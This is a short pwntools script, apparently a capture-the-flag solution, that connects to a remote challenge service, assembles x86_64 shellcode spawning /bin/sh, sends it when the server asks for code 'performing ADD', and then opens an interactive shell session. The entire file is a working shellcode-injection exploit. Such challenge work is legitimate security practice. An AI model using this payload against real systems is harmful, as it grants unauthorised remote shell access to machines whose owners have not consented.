from pwn import *
# 运行客户端连接函数
context.log_level ='DEBUG'
context.arch = 'x86_64'
#websocket.enableTrace(True)
p = remote("10.194.164.30","52824")
sc_asm = shellcraft.sh()
sc = asm(sc_asm)
p.sendafter(b"Request-1: give me code that performing ADD",sc)
p.interactive()